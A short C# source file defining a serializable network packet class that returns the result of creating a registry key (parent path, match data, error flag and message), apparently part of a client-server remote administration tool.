using MosaiqueServeur.Models;
using Serveur.Controllers.Server;
using Serveur.Packets;
using ZeroFormatter;

namespace MosaiqueServeur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetCreateRegistryKeyResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetCreateRegistryKeyResponse;
            }
        }

        [Index(0)]
        public virtual string ParentPath { get; set; }

        [Index(1)]
        public virtual RegSeekerMatch Match { get; set; }

        [Index(2)]
        public virtual bool IsError { get; set; }

        [Index(3)]
        public virtual string ErrorMsg { get; set; }

        public GetCreateRegistryKeyResponse()
        {
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
